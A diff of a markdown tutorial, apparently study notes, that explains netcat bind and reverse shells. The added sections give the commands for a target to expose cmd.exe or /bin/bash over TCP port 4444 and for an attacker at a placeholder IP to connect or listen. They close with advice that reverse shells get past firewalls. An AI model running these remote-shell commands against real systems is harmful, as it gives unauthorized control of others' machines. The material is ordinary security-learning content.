@@ -75,20 +75,46 @@ This textual exchange of messages can be used to do command redirection.
 We can take an executable file and redirect the input, output, and error messages to a TCP/UDP port rather than the default console.
 There are two tipes of connection that can be enstablished, and it's really important to understand when one rather than the other should be  used. 
 
-### Binding shell 
-A binding shell is enstablished when a server that has a public ip address opens a port to a client and binds a shell to that port.(fig.1)
+### Bind shell 
+A bind shell is enstablished when a server that has a public ip address opens a port to a client and binds a shell to that port.(fig.1)
 So when the client connects to this public address on this port it will be welcomed with the server command prompt.
 
+![bindshell](https://www.dropbox.com/s/ul38konoyhnx232/2017-12-01%2016.46.29.jpg?raw=1)
 
+To create a bind shell the attacker should connect (as client) to the target (server).
+The *target* will open a netcat session as server with a shell binded to it (es. from Windows):
 
-![bindingshell](https://www.dropbox.com/s/ul38konoyhnx232/2017-12-01%2016.46.29.jpg?raw=1)
+`netcat -nlvp 4444 -e cmd.exe`
 
+Parameters:
++ -e  execute
+
+The *attacker* will then connect to the server and get command prompt access:
+a.b.c.d is the public IP address of the server.
+`netcat -nv a.b.c.d 4444`
+From now on, everything written on the attacker computer will be sent to cmd.exe on the target computer and the output redirected back to the attacker.
 
 
 
 ### Reverse shell
 
 ![reverseshell](https://www.dropbox.com/s/8uvared7qrkz9dv/2017-12-01%2017.02.28.jpg?raw=1)
+
+To create a reverse shell the attacker is the server and the target will connect to it as client.
+The *attacker* will create a server.
+`netcat -nlvp 4444`
+
+The *target* will connect to the server and bind a shell to the opne TCP port (es. from Linux):
+a.b.c.d is the public IP address of the server 
+`netcat -nv a.b.c.d -e /bin/bash`
+
+### Conclusions.
+Which type of connection should I use? 
+If you are on a LAN, both method will work just fine. 
+In a real scenario the computer to attack will be positioned inside a private network and the attacker will not be able to connect to it because some kind of firewall will block the incoming connection to that port ! 
+Usually firewalls block incoming connection and not outgoing connections, this is why we should use a reverse shell.
+A *reverse shell* allows to the target to connect to us (and we should have control on our router firewall) through our public IP. 
+
 
 ## ncat and encrypted link between a server and a client (SSL)
 coming..
